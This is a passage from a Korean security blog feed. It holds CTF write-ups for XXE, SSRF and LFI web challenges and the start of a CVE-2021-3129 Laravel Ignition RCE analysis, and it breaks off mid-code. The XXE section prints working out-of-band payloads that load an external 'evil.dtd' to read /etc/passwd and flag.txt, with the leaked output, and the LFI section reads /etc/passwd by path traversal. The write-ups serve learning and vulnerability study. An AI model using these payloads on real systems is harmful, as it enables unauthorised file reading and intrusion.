class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request</span><br><span class="line">POST &#x2F;customize HTTP&#x2F;1.1</span><br><span class="line">Host: 207.180.200.166:5000</span><br><span class="line">Content-Length: 175</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Cookie: session&#x3D;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE pocas [&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;141.164.52.207&#x2F;test&quot;&gt;]&gt;</span><br><span class="line">&lt;pocas&gt;</span><br><span class="line">    &lt;color&gt;&amp;xxe;&lt;&#x2F;color&gt;</span><br><span class="line">    &lt;size&gt;40px&lt;&#x2F;size&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Aapache Log</span><br><span class="line">207.180.200.166 - - [31&#x2F;Jan&#x2F;2021:12:14:10 +0000] &quot;GET &#x2F;test HTTP&#x2F;1.0&quot; 404 456 &quot;-&quot; &quot;-&quot;</span><br></pre></td></tr></table></figure><p>확인을 해보니 잘 되는 것을 볼 수 있습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request</span><br><span class="line">POST &#x2F;customize HTTP&#x2F;1.1</span><br><span class="line">Host: 207.180.200.166:5000</span><br><span class="line">Content-Length: 170</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.96 Safari&#x2F;537.36</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Cookie: session&#x3D;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;141.164.52.207&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">%xxe;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Response</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Sun, 31 Jan 2021 12:04:41 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 1343</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Cookie</span><br><span class="line"></span><br><span class="line">Invalid URI: http:&#x2F;&#x2F;141.164.52.207&#x2F;root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;ash</span><br><span class="line">bin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin</span><br><span class="line">daemon:x:2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologin</span><br><span class="line">adm:x:3:4:adm:&#x2F;var&#x2F;adm:&#x2F;sbin&#x2F;nologin</span><br><span class="line">(생략)</span><br><span class="line">guest:x:405:100:guest:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">uwsgi:x:100:101:uwsgi:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin</span><br><span class="line">, line 2, column 77 (evil.dtd, line 2)</span><br></pre></td></tr></table></figure><p>처음 해보는 기법이라 해외 <a href="https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/">블로그</a>를 보며 공부를 하고, 진행했는데 좀 신기했습니다. 여튼 oob xxe를 이용해서 <code>/etc/passwd</code>를 긁어오니 잘 긁어오는 것을 볼 수 있습니다. 이제 FLAG가 들어있는 파일만 읽으면 되는데 파일을 모르니 한 번 찾아보겠습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request</span><br><span class="line">POST &#x2F;customize HTTP&#x2F;1.1</span><br><span class="line">Host: 207.180.200.166:5000</span><br><span class="line">Content-Length: 168</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Cookie: session&#x3D;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;141.164.52.207&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">%xxe;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Response</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Sun, 31 Jan 2021 12:17:57 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 102</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Cookie</span><br><span class="line"></span><br><span class="line">Invalid URI: http:&#x2F;&#x2F;141.164.52.207&#x2F;flag&#123;i7_1s_n0t_s0_bl1nd3721&#125;</span><br><span class="line">, line 2, column 77 (evil.dtd, line 2)</span><br></pre></td></tr></table></figure><p>그래서 <code>flag</code>, <code>flag.php</code>, <code>flag.txt</code>를 하나 하나 다 확인 해보니 <code>flag.txt</code>가 존재했고, FLAG가 읽히는 것을 볼 수 있었습니다.<br></p><blockquote><p>FLAG : flag{i7_1s_n0t_s0_bl1nd3721}</p></blockquote><hr><h2 id="Web-firstapp-496-pts"><a href="#Web-firstapp-496-pts" class="headerlink" title=" (Web) firstapp [496 pts]"></a><span style="color:#21C587"></span> (Web) firstapp [496 pts]</h2><blockquote><p>firstapp 문제는 SSRF 취약점을 이용해서 내부 서버에 있는 파일을 릭하는 문제입니다.<br></p></blockquote><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/firstapp/1.png?raw=true"></p><p>일단 문제로 들어오면 login이 되지 않았다고 뜨는 것을 볼 수 있습니다. 여기서 <code>/login</code>이 존재할 거 같다는 생각을 할 수 있고, <code>/login</code>으로 가서 아무 아이디/비밀번호로 로그인을 하면 로그인이 됩니다.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/firstapp/2.png?raw=true"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;profile?id&#x3D;&lt;name&gt;</span><br></pre></td></tr></table></figure><p>로그인을 하고 들어오면 위와 같이 3개의 프로필이 있는 것을 볼 수 있습니다. 프로필은 위와 같이 <code>/profile</code>에서 <code>id</code> 파라미터로 참조하게 됩니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;profile?id&#x3D;flag</span><br></pre></td></tr></table></figure><p>그래서 <code>id</code>의 값으로 flag를 주니 <code>flag.png</code> 파일이 하나 나오는데 처음에는 이 사진을 HxD로 열어서 확인하면 FLAG가 있을 줄 알았는데 존재하지 않았습니다. 그래서 일단 여기까지 하고 답이 없어서 Dirb를 이용해서 디렉터리 브루트 포싱을 진행했습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@py:~# dirb http:&#x2F;&#x2F;45.134.3.200:3000&#x2F; ~&#x2F;common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sun Jan 31 08:17:05 2021</span><br><span class="line">URL_BASE: http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;</span><br><span class="line">WORDLIST_FILES: &#x2F;root&#x2F;common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http:&#x2F;&#x2F;45.134.3.200:3000&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;css (CODE:301|SIZE:173)</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;get_file (CODE:200|SIZE:18)</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;images (CODE:301|SIZE:179)</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;login (CODE:200|SIZE:5661)</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;Login (CODE:200|SIZE:5661)</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;logout (CODE:302|SIZE:28)</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;profile (CODE:200|SIZE:24)</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sun Jan 31 08:33:29 2021</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 7</span><br><span class="line">root@py:~#</span><br></pre></td></tr></table></figure><p>dirb 툴을 돌려보니 <code>/get_file</code>이 존재하는 것을 알 수 있었고, 혹시나 <code>/get_url</code>도 있나 해보니 <code>/get_url</code>도 있었습니다. 이로서 우리는 2개의 벡터를 더 찾았습니다.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/firstapp/3.png?raw=true"></p><p>제일 먼저 <code>/get_file</code>에서 시도해보았습니다. 일단 파라미터를 알지 못 하지만 file이라는 파라미타를 사용하고 있을 거 같다는 생각을 할 수 있습니다. 그래서 file 파라미터로 flag, flag.txt, flag.py, flag.php 등 등을 읽어 보려 했지만 어떤 값이 들어와도 <code>SRSLY ???</code>라는 문자열만 출력이 되었습니다.<br></p><p>하지만 아까 게싱을 해서 <code>/get_url</code>이 존재한다는 것을 알아냈습니다. 그래서 SSRF를 이용해서 FLAG가 들어있는 파일을 긁어 오기로 했습니다.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/firstapp/4.png?raw=true"></p><p><code>/get_url</code>에서 일단 url이라는 파라미터로 SSRF를 시도해보니 <code>not logged in</code>이 뜨는 것을 볼 수 있습니다. 분명 로그인을 했는 데, <code>not logged in</code>이 뜨는 이유는 내부 서버로 잘 접근을 했다는 것 입니다.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/firstapp/5.png?raw=true"></p><p>그래서 SSRF를 이용해서 flag.* 파일을 모두 읽어 보니 flag.txt 파일이 존재하는 것을 알 수 있었고, 해당 파일 내용으로 FLAG가 있는 것을 볼 수 있습니다.<br></p><blockquote><p>FLAG : flag{h0p3_y0u_l1ked_my_@pp5613}</p></blockquote><hr><h2 id="Web-waffed-496-pts"><a href="#Web-waffed-496-pts" class="headerlink" title=" (Web) waffed [496 pts]"></a><span style="color:#21C587"></span> (Web) waffed [496 pts]</h2><blockquote><p>waffed 문제는 Cookie 변조와 LFI 취약점을 이용해서 flag를 가져오는 문제입니다.</p></blockquote><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/waffed/1.png?raw=true"></p><p>문제로 들어오면 <code>waffed</code> 사이트가 뜨는 것을 볼 수 있습니다. 해당 사이트는 각 코인마다 퍼센트지를 보여지는 사이트입니다.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/waffed/2.png?raw=true"></p><p><code>LEARN MORE</code> 버튼을 눌러보면 현재 선택한 코인의 퍼센트지를 그래프를 보여주고 있는 것을 볼 수 있고, 현재 코인 이름은 <code>price_feed</code> 쿠키에 저장이 되어 있습니다. 그리고 다른 코인의 그래프를 볼 수 있게 설정하는 기능도 있습니다. 그럼 한 번 다른 코인으로 바꾸는 요청을 잡고, 헤더를 확인해보겠습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request</span><br><span class="line">GET &#x2F;changeFeed&#x2F;DAI HTTP&#x2F;1.1</span><br><span class="line">Host: 207.180.200.166:9090</span><br><span class="line">Cookie: session&#x3D;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Response</span><br><span class="line">HTTP&#x2F;1.1 302 FOUND</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Sun, 31 Jan 2021 13:19:56 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 219</span><br><span class="line">Location: http:&#x2F;&#x2F;207.180.200.166:9090&#x2F;trade</span><br><span class="line">Connection: close</span><br><span class="line">Set-Cookie: price_feed&#x3D;REFJ; Path&#x3D;&#x2F;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD HTML 3.2 Final&#x2F;&#x2F;EN&quot;&gt;</span><br><span class="line">&lt;title&gt;Redirecting...&lt;&#x2F;title&gt;</span><br><span class="line">&lt;h1&gt;Redirecting...&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;p&gt;You should be redirected automatically to target URL: &lt;a href&#x3D;&quot;&#x2F;trade&quot;&gt;&#x2F;trade&lt;&#x2F;a&gt;.  If not click the link.</span><br></pre></td></tr></table></figure><p>헤더를 보면 요청을 하면 <code>DAI</code>라는 코인으로 바꾸고, 바로 그래프가 있는 곳으로 리다이렉션 시켜주는 것을 볼 수 있습니다. 여기서 중요한 부분은 응답에 <code>Set-Cookie</code> 헤더를 보면 <code>price_feed</code>의 값으로 <code>REFJ</code>가 들어있는 것을 볼 수 있습니다. <code>REFJ</code>는 우리가 바꾼 코인의 이름(DAI)이 b64로 인코딩되어 들어간 것 입니다.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/waffed/3.png?raw=true"></p><p>즉, 서버에서는 b64로 해당 쿠키 값을 디코딩해서 사용한다는 것 입니다. 그래서 일단 SQL Injection을 시도해보기 위해서 페이로드를 b64 인코딩을 해줘서 보내주니 <code>WOOPS</code>만 뜨고 아무 일도 일어나지 않았습니다.<br></p><p>하지만 여기서 <code>price_feed</code> 값으로 코인 이름을 바꿔서 코인에 대한 파일을 조회하는 거라면?이라고 생각을 했습니다. 그 이유는 코인마다 그래프도 다 다르기 때문에 모든 데이터를 각 코인의 파일로 관리하고 있을 거라는 생각이 들었습니다. 그래서 바로 LFI를 진행했고, 일단 <code>/etc/passwd</code>를 긁어오기를 시도했습니다.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/waffed/3.png?raw=true"></p><p>그래서 <code>/etc/passwd</code>를 b64로 인코딩해서 쿠키 값으로 설정하고, 새로 고침을 해주니 SQL Injection과 마찬가지로 <code>WOOPS</code>라고 뜨는 것을 볼 수 있습니다.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/waffed/4.png?raw=true"></p><p>하지만 현재 경로에서 해당 파일이 없어 <code>WOOPS</code>가 출력되는 걸 수도 있기 때문에 상위로 한 번 한 번 올라가며 모두 시도 해보았는데, 총 4번 올라가서 <code>../../../../etc/passwd</code>를 읽어보니 <code>WOOPS</code>가 뜨지 않고, 그래프가 있는 창으로 리다이렉션이 되었습니다. 그런데 이상한 점은 그래프는 있는데 그래프에 데이터가 존재하지 않았습니다.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/waffed/5.png?raw=true"></p><p>그래서 그래프의 소스 코드를 확인해보니 그래프를 만드는 JS 코드가 있었고, 그래프의 data 값으로 <code>/etc/passwd</code>의 값이 들어가 있는 것을 볼 수 있었습니다. 예상대로 각 코인의 데이터를 파일로 관리하고 있었습니다.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/waffed/6.png?raw=true"></p><p>앞에 모든 문제도 FLAG는 <code>flag.txt</code>에 있었기 때문에 이번 문제도 상위로 4번 올라가 <code>../../../../flag.txt</code>를 읽어주니 그래프의 data에 FLAG가 있는 것을 볼 수 있었습니다.<br></p><blockquote><p>flag{w@fs_r3@lly_d0_Suck8245}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LFI </tag>
            
            <tag> SSRF </tag>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-3129 RCE in Laravel Debug mode</title>
      <link href="2021/01/25/2021-01-25-CVE-2021-3129/"/>
      <url>2021/01/25/2021-01-25-CVE-2021-3129/</url>
      
        <content type="html"><![CDATA[<p>Laravel Debug mode에서 발견된 CVE-2021-3129 취약점을 분석해보겠습니다. Laravel은 자유/오픈 소스 PHP 웹 프레임워크 중 하나라고 합니다. 해당 취약점은 보안 연구원이 Laravel을 기반으로 한 웹 사이트에서 취약점 진단을 하다가 디버그 모드에서 발견했다고 합니다. 해당 사이트는 전체적으로 안전했지만 웹 프레임워크 취약점을 이용해서 RCE를 트리거 했습니다.<br></p><table><thead><tr><th>CVE ID</th><th>Version</th><th>CVSS</th></tr></thead><tbody><tr><td>CVE-2021-3129</td><td>laravel &lt;= 8.4.2 and Ignition &lt;= 2.5.1</td><td>9.8</td></tr></tbody></table><p><br>CVE-2021-3129는 Laravel의 &lt;= V8.4.2 DEBUG MODE에서 모두 발생한다고 합니다. 2020년 11월 16일에 POC를 전달해주었고, 바로 다음 날 패치 버전을 발표했다고 합니다.<br></p><hr><h2 id="CVE-2021-3129"><a href="#CVE-2021-3129" class="headerlink" title="CVE-2021-3129"></a><em>CVE-2021-3129</em></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;_ignition&#x2F;execute-solution HTTP&#x2F;1.1</span><br><span class="line">Host: 141.164.52.207:8888</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.141 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;141.164.52.207:8888&#x2F;_ignition&#x2F;execute-solution</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 320</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">&quot;parameters&quot;:&#123;</span><br><span class="line">&quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">&quot;viewFile&quot;: &quot;&#x2F;work&#x2F;pentest&#x2F;laravel&#x2F;laravel&#x2F;resources&#x2F;views&#x2F;hello.blade.php&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>위 요청은 username이라는 변수로 템플릿을 생성해주는 로직의 요청 헤더 값이고, solution의 값은 <code>Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution</code>, viewFile의 값은 <code>/work/pentest/laravel/laravel/resources/views/hello.blade.php</code>인 것을 볼 수 있습니다. 하지만 solution, viewFile의 값은 임의의 값으로 수정이 가능합니다.<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Facade</span>\<span class="title">Ignition</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Facade</span>\<span class="title">Ignition</span>\<span class="title">Http</span>\<span class="title">Requests</span>\<span class="title">ExecuteSolutionRequest</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Facade</span>\<span class="title">IgnitionContracts</span>\<span class="title">SolutionProviderRepository</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Validation</span>\<span class="title">ValidatesRequests</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExecuteSolutionController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">ValidatesRequests</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">        ExecuteSolutionRequest <span class="variable">$request</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">        SolutionProviderRepository <span class="variable">$solutionProviderRepository</span></span></span></span><br><span class="line"><span class="function"><span class="params">    </span>) </span>&#123;</span><br><span class="line">        <span class="variable">$solution</span> = <span class="variable">$request</span>-&gt;getRunnableSolution();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$solution</span>-&gt;run(<span class="variable">$request</span>-&gt;get(<span class="string">&#x27;parameters&#x27;</span>, []));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> response(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>컨트롤러를 확인해봅시다. <code>ExecuteSolutionController</code> 클래스를 확인해 보면 run() 메서드를 실행하고, 인자 값으로는 parameters를 넘겨주는 것을 볼 수 있습니다. run() 메서드는 <code>MakeViewVariableOptionalSolution::run()</code>에 정의되어 있습니다.<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Facade</span>\<span class="title">Ignition</span>\<span class="title">Solutions</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Facade</span>\<span class="title">IgnitionContracts</span>\<span class="title">RunnableSolution</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">Facades</span>\<span class="title">Blade</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MakeViewVariableOptionalSolution</span> <span class="keyword">implements</span> <span class="title">RunnableSolution</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$output</span> = <span class="keyword">$this</span>-&gt;makeOptional(<span class="variable">$parameters</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$output</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            file_put_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$output</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">makeOptional</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$originalContents</span> = file_get_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$newContents</span> = 